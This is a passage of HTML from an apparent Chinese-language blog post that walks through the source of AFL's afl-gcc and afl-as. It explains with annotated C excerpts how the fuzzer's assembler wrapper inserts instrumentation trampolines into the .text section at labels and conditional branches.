class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (isatty(<span class=\"number\">2</span>) &amp;&amp; !getenv(<span class=\"string\">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">SAYF(cCYA <span class=\"string\">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class=\"string\">&quot; by &lt;lcamtuf@google.com&gt;\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> be_quiet = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>b. 检查参数是否完备</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (argc &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">SAYF(<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;for gcc or clang, letting you recompile third-party code with the required\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;runtime instrumentation. A common use pattern would be one of the following:\\n\\n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"string\">&quot;  CC=%s/afl-gcc ./configure\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;  CXX=%s/afl-g++ ./configure\\n\\n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"string\">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\\n\\n&quot;</span>,</span><br><span class=\"line\">     BIN_PATH, BIN_PATH);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>c. 找到as路径</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find_as(argv[<span class=\"number\">0</span>]);</span><br></pre></td></tr></table></figure>\n<p>d. 对于参数进行编辑</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edit_params(argc, argv);</span><br></pre></td></tr></table></figure>\n<p>e. 调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execvp(cc_params[<span class=\"number\">0</span>], (<span class=\"type\">char</span>**)cc_params);</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x3-edit-params\">0x3.edit_params()</h4>\n<p>edit_params()被调用于编辑各种参数.  最后传递给真正的编译器(gcc / clang)，对于as的路径进行处理，使之调用到as的封装, afl-as。</p>\n<p>//主要是一些细节方面的，之后遇到了再来仔细查看</p>\n<h4 id=\"0x4-find-as\">0x4. find_as()</h4>\n<p>通过环境变量AFL_PATH找到封装的as的路径</p>\n<p>//同样主要是细节方面</p>\n<h3 id=\"afl-as-c\">afl-as.c</h3>\n<h4 id=\"0x1-基础变量-2\">0x1. 基础变量</h4>\n<table>\n<thead>\n<tr>\n<th>NAME</th>\n<th>MEANING</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>static u8** as_params</td>\n<td><em>Parameters passed to the real ‘as’</em></td>\n</tr>\n<tr>\n<td>static u8*  input_file</td>\n<td><em>Originally specified input file</em></td>\n</tr>\n<tr>\n<td>static u8*  modified_file</td>\n<td><em>Instrumented file for the real ‘as’</em></td>\n</tr>\n<tr>\n<td>static u32  inst_ratio = 100</td>\n<td><em>Instrumentation probability (%)</em></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"0x2-main函数主要逻辑\">0x2. main函数主要逻辑</h4>\n<p>a. 同上，对各种模式的判断(这里和上面都对于APPLE都有不同，因为没接触过apple，暂且记下)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clang_mode = !!getenv(CLANG_ENV_VAR);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (isatty(<span class=\"number\">2</span>) &amp;&amp; !getenv(<span class=\"string\">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">SAYF(cCYA <span class=\"string\">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class=\"string\">&quot; by &lt;lcamtuf@google.com&gt;\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> be_quiet = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>b. 获取随机数种子</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gettimeofday(&amp;tv, &amp;tz);</span><br><span class=\"line\"></span><br><span class=\"line\">rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();</span><br><span class=\"line\"></span><br><span class=\"line\">srandom(rand_seed);</span><br></pre></td></tr></table></figure>\n<p>c. 编辑参数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edit_params(argc, argv);</span><br></pre></td></tr></table></figure>\n<p>d. 根据各种环境变量进行相关配置</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">if</span> (inst_ratio_str) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">sscanf</span>(inst_ratio_str, <span class=\"string\">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class=\"number\">1</span> || inst_ratio &gt; <span class=\"number\">100</span>) </span><br><span class=\"line\">      FATAL(<span class=\"string\">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"comment\">// 代码插桩率的设置</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (getenv(AS_LOOP_ENV_VAR))</span><br><span class=\"line\">    FATAL(<span class=\"string\">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  setenv(AS_LOOP_ENV_VAR, <span class=\"string\">&quot;1&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class=\"line\"><span class=\"comment\">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class=\"line\"><span class=\"comment\">     that... */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (getenv(<span class=\"string\">&quot;AFL_USE_ASAN&quot;</span>) || getenv(<span class=\"string\">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class=\"line\">    sanitizer = <span class=\"number\">1</span>;</span><br><span class=\"line\">    inst_ratio /= <span class=\"number\">3</span>;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>e. 代码插桩</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!just_version) add_instrumentation();</span><br></pre></td></tr></table></figure>\n<p>f. 调用as</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!(pid = fork())) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  execvp(as_params[<span class=\"number\">0</span>], (<span class=\"type\">char</span>**)as_params);</span><br><span class=\"line\">  FATAL(<span class=\"string\">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (pid &lt; <span class=\"number\">0</span>) PFATAL(<span class=\"string\">&quot;fork() failed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (waitpid(pid, &amp;status, <span class=\"number\">0</span>) &lt;= <span class=\"number\">0</span>) PFATAL(<span class=\"string\">&quot;waitpid() failed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!getenv(<span class=\"string\">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) unlink(modified_file);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exit</span>(WEXITSTATUS(status));</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x3-add-instrumentation-代码插桩\">0x3. add_instrumentation()代码插桩</h4>\n<h5 id=\"a-主要流程\">a. 主要流程</h5>\n<p>a-1. 打开输入文件和更改后的输出文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (input_file) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  inf = fopen(input_file, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!inf) PFATAL(<span class=\"string\">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> inf = <span class=\"built_in\">stdin</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class=\"number\">0600</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (outfd &lt; <span class=\"number\">0</span>) PFATAL(<span class=\"string\">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class=\"line\"></span><br><span class=\"line\">outf = fdopen(outfd, <span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!outf) PFATAL(<span class=\"string\">&quot;fdopen() failed&quot;</span>);  </span><br></pre></td></tr></table></figure>\n<p>a-2. 读取每一行到line数组</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">while</span> (fgets(line, MAX_LINE, inf)) &#123;<span class=\"comment\">//这个括号匹配到最后</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class=\"line\"><span class=\"comment\">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class=\"line\"><span class=\"comment\">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class=\"line\"><span class=\"comment\">       the trampoline now. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class=\"line\">        instrument_next &amp;&amp; line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;\\t&#x27;</span> &amp;&amp; <span class=\"built_in\">isalpha</span>(line[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"built_in\">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class=\"line\">              R(MAP_SIZE));</span><br><span class=\"line\"><span class=\"comment\">// 这里是defered mode插桩执行语句</span></span><br><span class=\"line\">      instrument_next = <span class=\"number\">0</span>;</span><br><span class=\"line\">      ins_lines++;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">fputs</span>(line, outf);</span><br></pre></td></tr></table></figure>\n<p>a-3. 对于插桩的核心处理，定位有跳转语句， 设置flag</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">if</span> (pass_thru) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class=\"line\"><span class=\"comment\">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class=\"line\"><span class=\"comment\">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;\\t&#x27;</span> &amp;&amp; line[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;.&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class=\"line\"><span class=\"comment\">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class=\"line\"><span class=\"comment\">         around them, so we use that as a signal. */</span></span><br><span class=\"line\"><span class=\"comment\">// 匹配文件中声明的段</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;p2align &quot;</span>, <span class=\"number\">8</span>) &amp;&amp;</span><br><span class=\"line\">          <span class=\"built_in\">isdigit</span>(line[<span class=\"number\">10</span>]) &amp;&amp; line[<span class=\"number\">11</span>] == <span class=\"string\">&#x27;\\n&#x27;</span>) skip_next_label = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;text\\n&quot;</span>, <span class=\"number\">5</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section\\t.text&quot;</span>, <span class=\"number\">13</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section\\t__TEXT,__text&quot;</span>, <span class=\"number\">21</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section __TEXT,__text&quot;</span>, <span class=\"number\">21</span>)) &#123;</span><br><span class=\"line\">        instr_ok = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>; </span><br><span class=\"line\">        <span class=\"comment\">// 尝试匹配.text，匹配成功设置标志位为1(即可以插桩)</span></span><br><span class=\"line\">        <span class=\"comment\">// 进入下一次迭代</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section\\t&quot;</span>, <span class=\"number\">8</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section &quot;</span>, <span class=\"number\">8</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;bss\\n&quot;</span>, <span class=\"number\">4</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;data\\n&quot;</span>, <span class=\"number\">5</span>)) &#123;</span><br><span class=\"line\">        instr_ok = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class=\"line\"><span class=\"comment\">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class=\"line\"><span class=\"comment\">       seen, and we do not instrument. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.code&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class=\"line\"><span class=\"comment\">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.att_syntax&quot;</span>)) skip_intel = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;#&#x27;</span> || line[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;#&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;#APP&quot;</span>)) skip_app = <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;#NO_APP&quot;</span>)) skip_app = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class=\"line\"><span class=\"comment\">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class=\"line\"><span class=\"comment\">       we want to catch:</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">         ^main:      - function entry point (always instrumented)</span></span><br><span class=\"line\"><span class=\"comment\">         ^.L0:       - GCC branch label</span></span><br><span class=\"line\"><span class=\"comment\">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span><br><span class=\"line\"><span class=\"comment\">         ^\\tjnz foo  - conditional branches</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">       ...but not:</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">         ^# BB#0:    - clang comments</span></span><br><span class=\"line\"><span class=\"comment\">         ^ # BB#0:   - ditto</span></span><br><span class=\"line\"><span class=\"comment\">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class=\"line\"><span class=\"comment\">         ^.LC0       - GCC non-branch labels</span></span><br><span class=\"line\"><span class=\"comment\">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class=\"line\"><span class=\"comment\">         ^\\tjmp foo  - non-conditional jumps</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class=\"line\"><span class=\"comment\">       with no leading dots on labels, hence the weird maze of #ifdefs</span></span><br><span class=\"line\"><span class=\"comment\">       later on.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class=\"line\">        line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;#&#x27;</span> || line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27; &#x27;</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class=\"line\"><span class=\"comment\">       right after the branch (to instrument the not-taken path) and at the</span></span><br><span class=\"line\"><span class=\"comment\">       branch destination label (handled later on). */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;\\t&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (line[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;j&#x27;</span> &amp;&amp; line[<span class=\"number\">2</span>] != <span class=\"string\">&#x27;m&#x27;</span> &amp;&amp; R(<span class=\"number\">100</span>) &lt; inst_ratio) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class=\"line\">                R(MAP_SIZE));</span><br><span class=\"line\"></span><br><span class=\"line\">        ins_lines++;</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"><span class=\"comment\">// 